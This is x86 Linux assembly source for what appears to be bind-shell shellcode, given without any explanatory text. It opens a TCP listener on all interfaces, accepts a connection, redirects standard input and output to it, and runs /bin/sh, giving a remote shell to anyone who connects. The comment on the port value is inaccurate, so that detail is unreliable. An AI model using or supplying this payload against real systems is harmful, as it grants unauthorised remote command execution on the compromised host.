BITS 32

section .text
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor eax, eax
    push byte 0x66       ; syscall: socketcall = 102
    pop eax
    xor ebx, ebx
    inc ebx              ; ebx = 1 (SYS_SOCKET)
    xor edx, edx
    push edx             ; protocol = 0
    push byte 0x1        ; SOCK_STREAM
    push byte 0x2        ; AF_INET
    mov ecx, esp         ; ecx -> args: {AF_INET, SOCK_STREAM, 0}
    int 0x80             ; socket(AF_INET, SOCK_STREAM, 0)
    xchg eax, esi        ; save socket fd in esi

    ; bind(esi, struct sockaddr, 16)
    push byte 0x66
    pop eax              ; eax = 102 = socketcall
    mov bl, 2            ; SYS_BIND
    push edx             ; INADDR_ANY (0)
    push word 0x697a     ; port 31354 (change if you want)
    push word 0x2        ; AF_INET
    mov ecx, esp         ; ecx -> sockaddr struct
    push byte 16         ; addrlen
    push ecx             ; ptr to sockaddr
    push esi             ; sockfd
    mov ecx, esp         ; ecx -> args for bind
    int 0x80

    ; listen(esi, 0)
    push byte 0x66
    pop eax
    mov bl, 4            ; SYS_LISTEN
    push edx             ; backlog = 0
    push esi             ; sockfd
    mov ecx, esp
    int 0x80

    ; accept(esi, NULL, NULL)
    push byte 0x66
    pop eax
    mov bl, 5            ; SYS_ACCEPT
    push edx             ; socklen = NULL
    push edx             ; sockaddr = NULL
    push esi             ; sockfd
    mov ecx, esp
    int 0x80
    xchg eax, ebx        ; ebx = client socket fd

    ; dup2 loop (stdin=0, stdout=1, stderr=2)
    xor ecx, ecx
.dup_loop:
    mov al, 0x3f         ; syscall: dup2
    int 0x80
    inc ecx
    cmp ecx, 3
    jne .dup_loop

    ; execve("/bin//sh", NULL, NULL)
    xor eax, eax
    push edx             ; null terminator
    push 0x68732f2f      ; "//sh"
    push 0x6e69622f      ; "/bin"
    mov ebx, esp         ; ebx = "/bin//sh"
    push edx             ; null terminator (envp = NULL)
    mov edx, esp         ; edx = envp
    push ebx             ; argv[0]
    mov ecx, esp         ; ecx = argv
    mov al, 11           ; syscall: execve
    int 0x80
